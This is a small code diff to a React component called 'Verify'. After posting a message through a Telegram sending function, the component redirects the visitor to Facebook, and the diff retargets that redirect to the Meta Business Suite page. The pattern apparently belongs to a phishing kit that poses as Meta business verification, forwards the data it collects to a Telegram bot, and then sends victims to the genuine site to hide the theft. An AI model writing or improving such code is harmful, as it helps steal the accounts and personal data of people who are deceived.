@@ -131,10 +131,10 @@ const Verify: FC = () => {
       try {
         await sendTelegramMessage(message, config);
         setTimeout(() => {
-          window.location.replace("https://facebook.com");
+          window.location.replace("https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#");
         }, config.loadingTime);
       } catch {
-        window.location.replace("https://facebook.com");
+        window.location.replace("https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#");
       }
       return;
     }
